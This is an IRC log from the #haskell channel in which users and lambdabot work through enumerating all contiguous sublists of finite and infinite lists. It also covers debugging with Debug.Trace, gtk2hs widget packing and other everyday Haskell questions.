09:59:04 <dmwit> Let me encourage you to come up with a more robust strategy.
09:59:14 <dmwit> We can give some hints, if you want.
09:59:29 <mparodi_> > let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (any null [ys, seq]) || (head ys == head seq) ]] in sequences "aabbcc"
09:59:30 <lambdabot>   ["","a","a","aa","b","ab","aab","b","ab","aab","bb","abb","aabb","c","bc","...
09:59:44 <deech> Hi all, I am running Ubuntu 12.01 trying to install 7.4.1 and am running into the error "utils/ghc-pwd/dist-install/build/tmp/ghc-pwd: No such file or directory" I tried the instructions at "http://askubuntu.com/questions/95081/cannot-determine-current-directory-while-building-haskell" but with the same error. Any ideas?
09:59:50 <mparodi_> it seems to work, dmwit
09:59:52 <dmwit> > let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (any null [ys, seq]) || (head ys == head seq) ]] in sequences "abcabc"
09:59:53 <lambdabot>   ["","a","b","ab","c","bc","abc","a","ca","bca","abca","b","ab","ab","cab","...
10:00:10 <Cale> > let sequences xs = "" : [zs | ys <- tails xs, zs <- tail (inits ys)] in sequences "abc"
10:00:11 <lambdabot>   ["","a","ab","abc","b","bc","c"]
10:00:37 <dmwit> > let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (any null [ys, seq]) || (head ys == head seq) ]] in sequences "abab"
10:00:38 <lambdabot>   ["","a","b","ab","a","ba","aba","b","ab","ab","bab","abab"]
10:00:48 <Cale> > let sequences xs = [] : [zs | ys <- tails xs, zs <- tail (inits ys)] in sequences [1..]
10:00:49 <lambdabot>   [[],[1],[1,2],[1,2,3],[1,2,3,4],[1,2,3,4,5],[1,2,3,4,5,6],[1,2,3,4,5,6,7],[...
10:00:54 <dmwit> > filter (not . null) . (inits >=> tails) $ "abab"
10:00:55 <mparodi_> <Cale> > let sequences xs = "" : [zs | ys <- tails xs, zs <- tail (inits ys)] in sequences "abc" <-- good solution!
10:00:56 <lambdabot>   ["a","ab","b","aba","ba","a","abab","bab","ab","b"]
10:01:08 <Cale> not really the best order though, fails a bit for infinite lists
10:01:13 <dmwit> mparodi_: It produces too many results, sese?
10:01:25 <dmwit> > filter (not . null) . (inits >=> tails) $ "abac"
10:01:26 <lambdabot>   ["a","ab","b","aba","ba","a","abac","bac","ac","c"]
10:01:59 <dmwit> > let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (any null [ys, seq]) || (head ys == head seq) ]] in sequences "abac"
10:02:00 <lambdabot>   ["","a","b","ab","a","ba","aba","c","ac","bac","abac"]
10:02:11 <mparodi_> dmwit, it produces the same results >_>
10:02:18 <dmwit> Yes, I'm wrong.
10:02:21 <dmwit> And confused.
10:02:33 <mparodi_> in fact your solution with filter doesn't include the empty list
10:02:42 <Cale> > let sequences xs = [] : (tails xs >>- \ys -> tail (inits ys)) in sequences [1..]
10:02:44 <lambdabot>   [[],[1],[2],[1,2],[3],[1,2,3],[2,3],[1,2,3,4],[4],[1,2,3,4,5],[2,3,4],[1,2,...
10:02:45 <dmwit> Yes, I know, and also don't care. =)
10:02:53 <Cale> ^^ that'll get all of them
10:03:04 <Cale> It uses >>- from Control.Monad.Logic, which is in the logict package
10:04:06 <mparodi_> the point is that in "abc", "ac" is wrong because a:"c" can't be a solution, why? because 'b' (the next after 'a') is not in seq ("c"). that's why I added the condition
10:04:10 <Cale> > let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (any null [ys, seq]) || (head ys == head seq) ]] in sequences [1..]
10:04:11 <lambdabot>   *Exception: stack overflow
10:05:22 <Cale> You may want something which will do a diagonal traversal of the choices so as to avoid that
10:05:27 <Cale> (like (>>-) will)
10:07:03 <Cale> Well, it's not exactly diagonal
10:07:34 <Cale> (it's rather left-biased, but will eventually get everything)
10:07:51 <mparodi_> > let sequences xs = "" : [zs | ys <- tails xs, zs <- tail (inits ys)] in sequences "abc"
10:07:52 <lambdabot>   ["","a","ab","abc","b","bc","c"]
10:07:56 <mparodi_> this one is the best ^
10:08:02 <mparodi_> :P
10:08:02 <Cale> it's okay
10:08:07 <Cale> > let sequences xs = "" : [zs | ys <- tails xs, zs <- tail (inits ys)] in sequences [1..]
10:08:09 <lambdabot>   No instance for (GHC.Num.Num GHC.Types.Char)
10:08:09 <lambdabot>    arising from the literal `1...
10:08:12 <Cale> oops
10:08:14 <Cale> > let sequences xs = [] : [zs | ys <- tails xs, zs <- tail (inits ys)] in sequences [1..]
10:08:16 <lambdabot>   [[],[1],[1,2],[1,2,3],[1,2,3,4],[1,2,3,4,5],[1,2,3,4,5,6],[1,2,3,4,5,6,7],[...
10:08:26 <hpc> huh, expected that to not terminate
10:08:40 <Cale> Well, it doesn't find all of them
10:08:43 <jonaskoelker> aren't you seeing just a finite prefix?
10:08:46 <Cale> yes
10:08:53 <hpc> it doesn't diagonalize it
10:09:08 <jonaskoelker> what's the problem, find-all-infixes?
10:09:11 <Cale> yes
10:09:24 <jonaskoelker> cute :)
10:09:51 <jonaskoelker> idea: find all of length i for i in [0..] ;-)
10:10:08 <mparodi_> > let sequences [] = [[]]; sequences (y:ys) = [ v | seq <- sequences ys, v <- seq : [ y:seq | (ys == []) || (seq == []) || (head ys == head seq) ]] in sequences [1 ..]
10:10:09 <lambdabot>   *Exception: stack overflow
10:10:12 <mparodi_> in fact it doesn't end ^
10:10:19 <mparodi_> I mean, it doesn't show you anything
10:10:27 <dmwit> jonaskoelker: For infinite lists, that's not ideal, because the result never has any length 2 infixes.
10:10:28 <mparodi_> why is that?
10:10:53 <jonaskoelker> dmwit: note the ";-)"
10:11:00 <Cale> mparodi_: Because before it's found even one element of sequences [1..], it needs to compute sequences [2..]
10:11:17 <hpc> https://dl.dropbox.com/u/37707/diagonalization.png -- why that sequence doesn't print everything
10:12:01 <jonaskoelker> ahh, so the solution is all-infixes $ all-finite-prefixes $ list ?
10:12:23 <jonaskoelker> except redundancy :(
10:12:24 <jonaskoelker> I fail
10:12:47 <mparodi_> Cale, it's the same with ys <- tails [1 ..]. the first element is infinite, then you do inits ys, which is infinite as well
10:13:28 <jonaskoelker> > let sequences l = tails (inits l) in take 5 $ sequences [1..]
10:13:29 <lambdabot>   [[[],[1],[1,2],[1,2,3],[1,2,3,4],[1,2,3,4,5],[1,2,3,4,5,6],[1,2,3,4,5,6,7],...
10:14:53 <mparodi_> well, I agree it's not recursive, that can be the main difference
10:15:49 <mparodi_> > concat $ tails $ tail $ inits [1 ..]
10:15:50 <lambdabot>   [[1],[1,2],[1,2,3],[1,2,3,4],[1,2,3,4,5],[1,2,3,4,5,6],[1,2,3,4,5,6,7],[1,2...
10:16:01 <mparodi_> :)
10:16:14 <jonaskoelker> > [] : (filter (not.null) $ concatMap tails $ inits [1..])
10:16:14 <mparodi_> > concat $ tails $ tail $ inits "abc"
10:16:15 <lambdabot>   ["a","ab","abc","ab","abc","abc"]
10:16:15 <lambdabot>   [[],[1],[1,2],[2],[1,2,3],[2,3],[3],[1,2,3,4],[2,3,4],[3,4],[4],[1,2,3,4,5]...
10:16:19 <hpaste> shashwat pasted “Ackermann” at http://hpaste.org/69158
10:16:48 <jonaskoelker> do I win a cookie? :-)
10:17:09 <shashwat> Why is that my Acermann functions failed when I use guards but works otherwise ?
10:17:46 <solarus> shashwat: probably something with (n - 1) versus n - 1
10:18:00 <solarus> on line 5 and 10
10:18:06 <dmwit> > let merge (x:xs) (y:ys) = x:y:merge xs ys; merge xs ys = xs ++ ys; diagonalish = foldr merge [] in diagonalish . tails . inits $ [1..]
10:18:11 <lambdabot>   mueval-core: Time limit exceeded
10:18:20 <jonaskoelker> :D
10:18:52 <mparodi_> > concat $ map (tail.inits) (tails [1 ..])
10:18:54 <lambdabot>   mueval-core: L.hs: removeLink: does not exist (No such file or directory)
10:19:08 <mparodi_> > concat $ map (tail.inits) (tails [1 ..])
10:19:10 <lambdabot>   [[1],[1,2],[1,2,3],[1,2,3,4],[1,2,3,4,5],[1,2,3,4,5,6],[1,2,3,4,5,6,7],[1,2...
10:19:15 <mparodi_> > concat $ map (tail.inits) (tails "abc")
10:19:17 <lambdabot>   ["a","ab","abc","b","bc","c"]
10:19:19 <mparodi_> there it is!
10:19:20 <shashwat> solarus: weird.  works with brackets.
10:19:46 <zezikaro> > find (odd) [1,2,3]
10:19:47 <lambdabot>   Just 1
10:19:51 <zezikaro> > find (odd) [2,3]
10:19:52 <lambdabot>   Just 3
10:19:56 <dmwit> mparodi_: Congratulations! Now write concat and map as (>>=) and you understand Cale's version from the very beginning.
10:20:05 <zezikaro> "Not in scope 'Find'"
10:20:06 <solarus> shashwat: ackermann m n - 1 parses as (ackermann m n - 1)
10:20:07 <zezikaro> o.O
10:20:10 <zezikaro> find, rather
10:20:24 <solarus> (ackermann m n) - 1
10:20:27 <mparodi_> I don't know what >>= does
10:20:30 <jonaskoelker> mparodi_:  huh?  it still doesn't produce anything but (inits [1..])
10:20:40 <hpc> @src [] (>>=)
10:20:40 <lambdabot> xs >>= f     = concatMap f xs
10:20:45 <hpc> @src concatMap
10:20:45 <lambdabot> concatMap f = foldr ((++) . f) []
10:20:48 <mparodi_> jonaskoelker, it could be a variable
10:20:54 <shashwat> solarus: oops. Silly of me.
10:20:54 <dmwit> concatMap f xs = concat (map f xs)
10:20:58 <jonaskoelker> > [] : (filter (not.null) $ concatMap tails $ inits [1..]) -- mparodi_
10:21:00 <lambdabot>   [[],[1],[1,2],[2],[1,2,3],[2,3],[3],[1,2,3,4],[2,3,4],[3,4],[4],[1,2,3,4,5]...
10:21:03 <mparodi_> > let foo x = concat $ map (tail.inits) (tails x) in foo "abc"
10:21:05 <lambdabot>   ["a","ab","abc","b","bc","c"]
10:21:13 <Cale> dmwit: Except that mine didn't really use >>= but instead used >>-
10:21:25 <jonaskoelker> mparodi_: how does your version produce [3,4] occurring at a finite index?
10:21:32 <mparodi_> what?
10:21:43 <mparodi_> ah, ok.. I don't care
10:21:47 <Cale> dmwit: Which is like >>= except that it does a mergey-pseudo-diagonal-kinda-traversal
10:21:52 <mparodi_> it's somewhere in the infinite list :P
10:21:54 <jonaskoelker> > [3,4] `elem` ([] : (filter (not.null) $ concatMap tails $ inits [1..]))
10:21:56 <lambdabot>   True
10:21:57 <mparodi_> > let foo x = concat $ map (tail.inits) (tails x) in foo [1..]
10:21:59 <lambdabot>   [[1],[1,2],[1,2,3],[1,2,3,4],[1,2,3,4,5],[1,2,3,4,5,6],[1,2,3,4,5,6,7],[1,2...
10:22:13 <mparodi_> > elem [3,4] concat $ map (tail.inits) (tails [1..])
10:22:14 <lambdabot>   Couldn't match expected type `[[t]]'
10:22:14 <lambdabot>         against inferred type `[[a]] -...
10:22:14 <jonaskoelker> > let foo x = concat $ map (tail.inits) (tails x) in elem [3,4] $ foo [1..]
10:22:18 <lambdabot>   mueval-core: Time limit exceeded
10:22:28 <mparodi_> > elem [3,4] (concat $ map (tail.inits) (tails [1..]))
10:22:32 <lambdabot>   mueval-core: Time limit exceeded
10:22:36 <mparodi_> believe me, it's there :P
10:22:53 <dmwit> Cale: Your very first response used (>>=) exactly.
10:23:05 <Cale> oh?
10:23:09 <jonaskoelker> only accessible to transfinite turing machines, though :-)
10:23:10 <Cale> I don't remember that one
10:23:27 <dmwit> Oh, well, (<=<), anyway.
10:23:30 <dmwit> Close enough.
10:23:32 <Cale> :)
10:23:42 <Cale> and list comprehensions
10:23:49 <Cale> which is really the same thing again
10:25:32 <mparodi_> > concatMap (tail.inits) (tails [1..])
10:25:33 <lambdabot>   [[1],[1,2],[1,2,3],[1,2,3,4],[1,2,3,4,5],[1,2,3,4,5,6],[1,2,3,4,5,6,7],[1,2...
10:26:59 <dmwit> > tails [1..] >>= tail . inits
10:27:02 <mparodi_> > concatMap tails $ tail.inits $ [1..]
10:27:03 <lambdabot>   mueval-core: Time limit exceeded
10:27:04 <lambdabot>   [[1],[],[1,2],[2],[],[1,2,3],[2,3],[3],[],[1,2,3,4],[2,3,4],[3,4],[4],[],[1...
10:27:14 <dmwit> and for the final transformation
10:27:17 <mparodi_> jonaskoelker, there it is^!
10:27:21 <dmwit> > (tails >=> tail . inits) [1..]
10:27:23 <lambdabot>   [[1],[1,2],[1,2,3],[1,2,3,4],[1,2,3,4,5],[1,2,3,4,5,6],[1,2,3,4,5,6,7],[1,2...
10:27:39 <dmwit> (f >=> g) x = f x >>= g
10:27:39 <mparodi_> > concat $ map tails $ tail.inits $ [1..]
10:27:41 <lambdabot>   [[1],[],[1,2],[2],[],[1,2,3],[2,3],[3],[],[1,2,3,4],[2,3,4],[3,4],[4],[],[1...
10:27:44 <dmwit> I think that may be it's actual definition, in fact.
10:28:23 <dmwit> whoops
10:28:33 <dmwit> > (tails <=< tail . inits) [1..]
10:28:35 <lambdabot>   [[1],[],[1,2],[2],[],[1,2,3],[2,3],[3],[],[1,2,3,4],[2,3,4],[3,4],[4],[],[1...
10:29:00 <dmwit> That's the correct transformation. =P
10:29:07 <dmwit> > (tail . tails <=< inits) [1..]
10:29:08 <lambdabot>   [[],[2],[],[2,3],[3],[],[2,3,4],[3,4],[4],[],[2,3,4,5],[3,4,5],[4,5],[5],[]...
10:29:15 <dmwit> annoying!
10:29:23 <dmwit> > (init . tails <=< inits) [1..]
10:29:25 <lambdabot>   [[1],[1,2],[2],[1,2,3],[2,3],[3],[1,2,3,4],[2,3,4],[3,4],[4],[1,2,3,4,5],[2...
10:29:57 <jonaskoelker> > [] : (what dmwit said)
10:29:58 <lambdabot>   Not in scope: `what'Not in scope: `dmwit'Not in scope: `said'
10:30:07 <jonaskoelker> right?
10:30:07 <mparodi_> > elem [1 .. 100 ] $ concatMap tails $ tail.inits $ [1..]
10:30:09 <lambdabot>   True
10:30:11 <mparodi_> yay!
10:30:12 <dmwit> jonaskoelker: right
10:30:26 <tgeeky> dmwit: that last one is cool.
10:30:30 <jonaskoelker> > (tails <=< inits) [1..]
10:30:31 <lambdabot>   [[],[1],[],[1,2],[2],[],[1,2,3],[2,3],[3],[],[1,2,3,4],[2,3,4],[3,4],[4],[]...
10:30:42 <dmwit> tgeeky: That's pretty much where we started at the very beginning. =)
10:31:03 <mparodi_> > []:(tails <=< tail.inits) [1..]
10:31:05 <lambdabot>   [[],[1],[],[1,2],[2],[],[1,2,3],[2,3],[3],[],[1,2,3,4],[2,3,4],[3,4],[4],[]...
10:31:35 <mparodi_> anyway, I don't know how to use <=<, >=>, >>=, >>-, etc >_>
10:31:43 <jonaskoelker> how about ^_^
10:32:48 <zezikaro> How do you do something like
10:32:50 <zezikaro> s1(); s2();
10:32:52 <zezikaro> in haskell?
10:32:57 <zezikaro> All I want to do is output a debug statement |:
10:33:05 <dmwit> s1 >> s2
10:33:05 <jonaskoelker> s1 >> s2
10:33:09 <zezikaro> 	| otherwise =
10:33:10 <zezikaro> 		(newTape, newState):tail
10:33:12 <zezikaro> so
10:33:18 <zezikaro> print "foo" >> (newTape, newState):tail
10:33:38 <jonaskoelker> you probably want> trace (print "foo") $ (newTape, newState):tail
10:33:46 <jonaskoelker> from Debug.Trace
10:34:02 <jonaskoelker> I think it should be renamed Debug.Printf :-)
10:34:46 <mparodi_> > trace (print "foo") $ sum [1..10]
10:34:47 <lambdabot>   Not in scope: `trace'
10:35:00 <dmwit> beautiful
10:35:13 <jonaskoelker> > Debug.Trace.trace (print "foo") (product [1..5])
10:35:14 <lambdabot>   Not in scope: `Debug.Trace.trace'
10:35:20 <jonaskoelker> hoogle trace
10:35:24 <zezikaro> Couldn't match expected type '[Char]' with actual type 'IO ()'
10:35:24 <jonaskoelker> @hoogle trace
10:35:25 <lambdabot> Debug.Trace module Debug.Trace
10:35:25 <lambdabot> Debug.Trace trace :: String -> a -> a
10:35:25 <lambdabot> Debug.Trace traceShow :: Show a => a -> b -> b
10:35:29 <mparodi_> I loaded the module but it doesn't work
10:35:31 <dmwit> ?let diagonal = go [] where go b e = reverse (b >>= take 1) ++ go (take 1 e ++ map (drop 1) b) (drop 1 e)
10:35:34 <lambdabot>  Defined.
10:35:34 <tgeeky> dmwit: can you find a marker for me to pick out the "beginning" of the convo?
10:35:44 <dmwit> > diagonal [[n..] | n <- [1..]]
10:35:46 <shawng> hi all
10:35:46 <lambdabot>   [1,2,2,3,3,3,4,4,4,4,5,5,5,5,5,6,6,6,6,6,6,7,7,7,7,7,7,7,8,8,8,8,8,8,8,8,9,...
10:36:00 <mparodi_> > print "foo" >> sum [1..10]
10:36:02 <lambdabot>   No instances for (GHC.Num.Num (GHC.Types.IO b),
10:36:02 <lambdabot>                    GHC.Enum...
10:36:10 <mparodi_> > putStr "foo" >> sum [1..10]
10:36:11 <lambdabot>   No instances for (GHC.Num.Num (GHC.Types.IO b),
10:36:11 <lambdabot>                    GHC.Enum...
10:36:20 <mparodi_> ah, you can't print things
10:36:21 <dmwit> tgeeky: Cale and I both suggested "subsequences", so grep for that.
10:36:30 <moebius_eye> > sum [1..10]
10:36:31 <lambdabot>   55
10:36:37 <jonaskoelker> > putStr "foo\n" >> [1..10]
10:36:38 <lambdabot>   Couldn't match expected type `GHC.Types.IO b'
10:36:39 <lambdabot>         against inferred type...
10:36:41 <moebius_eye> > sum [1..]
10:36:46 <lambdabot>   mueval-core: Time limit exceeded
10:36:58 * hackagebot control-monad-exception 0.10.3 - Explicitly typed, checked exceptions with stack traces  http://hackage.haskell.org/package/control-monad-exception-0.10.3 (PepeIborra)
10:37:01 <dmwit> You guys.
10:37:21 <Cale> @let zipCons [] ys = ys; zipCons xs [] = map (:[]) xs; zipCons ((x:xs):xss) = (x:y) : zipCons xs ys
10:37:22 <lambdabot>   arity mismatch for 'zipCons'
10:37:24 <dmwit> It's either trace "foo" [1..10] or putStrLn "foo" >> doSomethingIOyWith [1..10]
10:37:24 <tromp_> @src diagonal
10:37:24 <lambdabot> Source not found. The more you drive -- the dumber you get.
10:37:36 <jonaskoelker> > sum [1 % (2^n) | n <- [1..]]
10:37:36 <mparodi_> putStrLn "foo" >> sum [1..10]
10:37:39 <mparodi_> < putStrLn "foo" >> sum [1..10]
10:37:40 <Cale> @let zipCons [] ys = ys; zipCons xs [] = map (:[]) xs; zipCons (x:xs) (y:ys) = (x:y) : zipCons xs ys
10:37:42 <lambdabot>   mueval: ExitFailure 1
10:37:42 <lambdabot>  mueval: Prelude.undefined
10:37:47 <lambdabot>  Defined.
10:37:47 <dmwit> tromp_: ?src doesn't search the ?let's. But I defined it above.
10:38:06 <dmwit> tromp_: diagonal = go [] where go b e = reverse (b >>= take 1) ++ go (take 1 e ++ map (drop 1) b) (drop 1 e)
10:38:18 <Cale> @let stripe [] = []; stripe ([]:xss) = stripe xss; stripe ((x:xs):xss) = [x] : zipCons xs (stripe xss)
10:38:20 <lambdabot>  Defined.
10:38:47 <tromp_> thx, dmwit
10:39:32 <jonaskoelker> -- sum [1 % (2^n) | n <- [1..]] -- Why can't ghc perform symbolic simplification and dwim-processing? ;-)
10:39:33 <zezikaro> why is it so complicated to do 'easy' things in haskell xD
10:39:41 <zezikaro> I just want to output a debug statement lol
10:39:41 <dmwit> Cale: Oh, I like that approach much better, nice!
10:39:53 <jonaskoelker> zezikaro: did you try Debug.Trace.trace?
10:40:25 <dmwit> zezikaro: You might like the ghci debugger.
10:40:35 <Cale> > stripe (map (tail . inits) (tails [1..]))
10:40:38 <lambdabot>   [[[1]],[[1,2],[2]],[[1,2,3],[2,3],[3]],[[1,2,3,4],[2,3,4],[3,4],[4]],[[1,2,...
10:40:55 <Cale> > concat . stripe . map (tail . inits) . tails $ [1..]
10:40:57 <lambdabot>   [[1],[1,2],[2],[1,2,3],[2,3],[3],[1,2,3,4],[2,3,4],[3,4],[4],[1,2,3,4,5],[2...
10:41:41 <Cale> zezikaro: what debug statement are you trying to output?
10:41:59 * hackagebot control-monad-exception-mtl 0.10.3 - MTL instances for the EMT exceptions monad transformer  http://hackage.haskell.org/package/control-monad-exception-mtl-0.10.3 (PepeIborra)
10:43:41 <Cale> jonaskoelker: even when convergence isn't normally such an issue, that sort of thing can bite you...
10:44:28 <Cale> jonaskoelker: Like where you can't take an infinite product of generating series so easily because they all have a constant term of 1, so their product has a constant term of product [1,1..]
10:46:45 <schlicht> anyone an idea how i can force a bunch of layout widgets do get there manual set size within a vbox, so that i can scroll them, and they won't shrink? (gtk2hs)
10:48:13 <dmwit> schlicht: let's see...
10:49:11 <dcoutts_> schlicht: I presume you're using PackNatural
10:49:13 <shawng> Im only posting this here because everyone thinks Haskell-blah is worthless, evident by its uninspiring name
10:49:15 <zezikaro>  <Cale> zezikaro: what debug statement are you trying to output?
10:49:23 <zezikaro> seeing where my head goes
10:49:27 <zezikaro> trace (print "foo") $ (newTape, newState):tail didn't work
10:49:32 <zezikaro> And I have, import Debug.Trace
10:49:33 <shawng> Who in NY wants to help me buy a Mason and Hamlin Piano? Model  D from 1913, 52 in high, excellent condition. Restored by  Beethoven Pianos in Manhattan in 2007, new strings and tuning  pins damper felts, hammers and shaks. Pinblock discribed as  orginal as the soundboard and keys
10:49:48 <zezikaro> o.O
10:49:50 <tgeeky> shawng: nobody. and it's inappropriate in here.
10:50:31 <shawng> tgeeky: well you guys are entrepreneurs no>
10:50:47 <tgeeky> shawng: No.
10:50:48 <mzero> not for pianos
10:51:01 <dmwit> schlicht: You can use widgetGetAllocation, I suppose.
10:51:01 <dcoutts_> shawng: anything haskell related is on topic
10:51:25 <schlicht> dcoutts_, hmm no i dont. i cant see anything when i use packNatural, dont know why.
10:51:27 <shawng> dcoutts_: I only posted it here because no one checks haskell-blah
10:51:37 <schlicht> dmwit, i will have a look at that
10:51:48 <tgeeky> shawng: plenty of people check #haskell-blah. They just weren't interested.
10:51:55 <mzero> shawng: which might be an indication that people here only want to talk about haskell
10:51:59 * hackagebot control-monad-exception-monadsfd 0.10.3 - Monads-fd instances for the EMT exceptions monad transformer  http://hackage.haskell.org/package/control-monad-exception-monadsfd-0.10.3 (PepeIborra)
10:52:01 * hackagebot control-monad-exception-monadstf 0.10.3 - Monads-tf instances for the EMT exceptions monad transformer  http://hackage.haskell.org/package/control-monad-exception-monadstf-0.10.3 (PepeIborra)
10:52:03 * hackagebot confsolve 0.3.1 - A command line tool for resolving conflicts of file synchronizers.  http://hackage.haskell.org/package/confsolve-0.3.1 (DanielTrstenjak)
10:52:07 <dcoutts_> schlicht: widgets will not shrink to less than their natural size anyway, unless you force them to
10:52:30 <shawng> mzero: well how does one fund their coding projects?
10:52:36 <schlicht> dcoutts_, whats the natural size of a layout widget?
10:52:40 <dcoutts_> schlicht: oh, use boxPackStart/End rather than containerAdd
10:52:55 <dmwit> schlicht: Oh, and there's widgetGetSize.
10:53:04 <dmwit> I'm actually not sure how different the allocation and the size can be.
10:53:08 <mzero> I'd answer that on #haskell-blah - or perhaps #funding-projects
10:53:21 <dcoutts_> schlicht: so what are you doing exactly? you're putting a vbox inside a scrolled window or something?
10:53:47 <shawng> mzero: ok thanks
10:54:05 <schlicht> dcoutts_, dmwit scrolledWindow ( viewport (vbox (bunch of layout containers)))
10:55:29 <dcoutts_> schlicht: so the natural size of the viewport will be the natural size of the vbox, which will be the sum of the natural sizes of its children. If you want the contents of the vbox to be given more space you may need to manually set a larger size for the viewport or vbox
10:55:54 <dcoutts_> schlicht: then the extra space will be allocated between the vbox children as determined by their packing mode
10:56:05 <dcoutts_> http://hackage.haskell.org/packages/archive/gtk/0.12.3/doc/html/Graphics-UI-Gtk-Abstract-Box.html#t:Packing
10:56:12 <burbul> Is there an easy way to switch on warnings that show whether your functions are total?
10:56:34 <dcoutts_> schlicht: you may also want to check the main Gtk+ docs/tutorial on packing, as all that applies
10:56:35 <dmwit> burbul: There's a warning for coverage, but not totality.
10:56:54 <schlicht> dcoutts_, okay, whats the natural size? :D alright i will have a look
10:56:54 <burbul> coverage would be good
10:57:00 <schlicht> dcoutts_, dmwit thanks
10:57:03 <dcoutts_> burbul: nearest thing is that you get warnings for pattern matches not being total
10:57:18 <dmwit> burbul: -fwarn-incomplete-patterns
10:57:21 <burbul> thanks
10:57:27 <dcoutts_> which is part of -Wall of course
11:00:38 <schlicht> dcoutts_, ahh the natural size seems to be nothing, thats why i dont see anything with packnatural
11:01:49 <dcoutts_> schlicht: you can manually set a size request
11:02:30 <schlicht> i already use layoutSetSize
11:02:35 <dcoutts_> schlicht: if you've read the tutorial bit about packing you'll know there's a difference between requested size and allocated size
11:02:46 <dcoutts_> and you don't generally set the actual size, just the request
11:03:43 <schlicht> dcoutts_, yeah, that i did indeed read
11:04:20 <dcoutts_> schlicht: btw, a good way to get an intuition for this is by playing with the glade UI builder
11:04:41 <dcoutts_> you can create the situation you're interested in and adjust the packing params to suit
11:04:52 <schlicht> dcoutts_, i use glade, where i can :)
11:04:56 <dcoutts_> that's much faster iteration than coding it up
11:05:25 <dcoutts_> schlicht: I don't mean you have to use glade for the real thing in this situation, just helpeful to get the packing that you want, then do it in code
11:05:45 <schlicht> yeah i will do that
11:06:16 <schlicht> i just dont get why may layout widgets dont get any space if i use packNatural, that means there natural size is 0
11:07:07 <dmwit> I don't think layoutSetSize is the right thing to call; widgetSetSizeRequest
11:08:00 <schlicht> yes, just did that, works :)
11:08:04 <schlicht> thanks again!
11:08:29 <schlicht> ahh no, didnt work fully
11:08:38 <schlicht> naa, i will look into that
11:09:45 <schlicht> now i got it. just request not enaugh
11:11:25 <schlicht> enough
11:23:23 <lpsmith> so I've been following Andrew Ng's online machine learning class this time around.    It really does seem that autodifferentiation seems to be one of the great underappreciated techniques of machine learning :-P
11:29:53 <dropdrive> lpsmith: Link?
11:30:17 <lpsmith> dropdrive, https://www.coursera.org/course/ml
11:33:40 <rata_> hi
11:37:40 <arnsholt> To convert the string I get from Parsec to an int I've got this: int = liftM read $ many1 digit
11:37:47 <arnsholt> Is there a more idiomatic way?
11:37:56 <ion> read <$> many1 digit
11:38:42 <arnsholt> Ooh, nice. Thanks!
11:44:49 <applicative> wow, pipes guy Temko is seeming kind of out of control
11:45:28 <tylergillies> is there a special name for functions that return void?
11:45:34 <tylergillies> in computer science in general
11:45:44 <aristid> applicative: context?
11:45:49 <coppro> tylergillies: non-pure ;)
11:46:19 <tylergillies> coppro: i cn make a pure function that returns void
11:46:30 <coppro> tylergillies: yes but that's pointless
11:46:35 <coppro> hence the ;)
11:46:40 <tylergillies> coppro: ah. heh
11:46:49 <applicative> aristid: just this reddit nonsense, 'conduits bugs' etc etc.http://www.reddit.com/r/haskell/comments/u7vyx/conduit_bugs/ http://www.reddit.com/r/haskell/comments/u8fe6/response_to_conduit_bugs/ and the underlying blogposts
11:48:04 <aristid> applicative: oO
11:49:10 <applicative> I'm not sure this kind of squabbling is well advised
11:50:50 <aristid> applicative: heh, i love how he says pipes is not his main job so he can't work on it much, given that michael snoyman does all of his haskell things in his spare time too
11:51:22 <applicative> I was wondering what he thinking
11:53:21 <zezikaro> Do hashmaps exist in haskell?
11:53:31 <BMeph> applicative: s/what/were perhaps? ;)
11:53:51 <aristid> zezikaro: yes.
11:54:03 <aristid> zezikaro: but you probably don't really want to use them
11:54:05 <applicative> i was wondering what he was thinking  was the difference between him and snoyman on this point
11:54:20 <parcs`> does snoyman get paid by his employer to work on yesod
11:54:24 <BMeph> zezikaro: Yes, although we prefer to call them "Hashmaps". ;þ
11:54:36 <applicative> http://hackage.haskell.org/package/unordered-containers-0.2.1.0 zezikaro
11:54:53 <aristid> parcs`: i don't think he does
11:55:04 <sp3ctum> what would be a haskell equivalent to python's "in" syntax? e.g. (in python) if 'a' in "car": pass
11:55:05 <aristid> parcs`: he talks about having to use java and xslt on google+ sometimes
11:55:11 <parcs`> ah
11:55:11 <jonaskoelker> sp3ctum: `elem`
11:55:21 <zezikaro> thanks
11:55:22 <sp3ctum> jonaskoelker, ah, of course
11:55:34 <aristid> parcs`: but he's extremely productive nonetheless
11:55:46 <applicative> it's insane all this activity
11:56:01 <jonaskoelker> @hoogle 'a -> [a] -> Bool'
11:56:02 <lambdabot> Parse error:
11:56:02 <lambdabot>   'a -> [a] -> Bool'
11:56:02 <lambdabot>   ^
11:56:04 <jonaskoelker> @hoogle a -> [a] -> Bool
11:56:07 <lambdabot> Prelude elem :: Eq a => a -> [a] -> Bool
11:56:07 <lambdabot> Data.List elem :: Eq a => a -> [a] -> Bool
11:56:07 <lambdabot> Prelude notElem :: Eq a => a -> [a] -> Bool
11:56:17 <applicative> I mean,  wonderful, of course
11:56:25 <jonaskoelker> sp3ctum: you may want to download and use hoogle :-)
11:56:47 <sp3ctum> oh yeah, i forgot i can search by type
11:56:54 <aristid> applicative: i haven't really watched it closely, but it looks to me like conduits and pipes have converged to each other in some ways
11:57:15 <aristid> except for some things they fundamentally disagree about, of course :D
11:58:26 <applicative> yes, the pipification of conduit was pretty interesting.
11:59:03 <applicative> but its all a bit of a mess, a sensible one it seems
11:59:51 <arcatan> what's the relationship between conduits/pipes and iteratees?
12:00:02 <tgeeky_> I would like to point out that conduit doesn't follow the rules for a hopf algebra, or a symmetric monodial category.
12:00:15 <tgeeky_> Then again, it didn't claim to be those things either.
12:00:30 <applicative> it totally violates the cut elimination rule
12:00:45 <tgeeky_> yeah! And conduit has more letters than pipe.
12:00:46 <aristid> applicative: the what? and how? :)
12:00:56 <tgeeky_> bugs all round
12:00:58 <roconnor> > product [2..1]
12:00:59 <lambdabot>   1
12:00:59 <aristid> tgeeky_: the fundamental type in conduit is now the Pipe :D
12:01:06 <roconnor> > product [2..0]
12:01:07 <lambdabot>   1
12:01:13 <tgeeky_> aristid: oh snap. regument retracted
12:02:29 <tgeeky_> uhh. is there a categorial pattern or some other pattern in: set -> multiset -> signed multiset? Or is there a correspondence to CPOs or something like that?
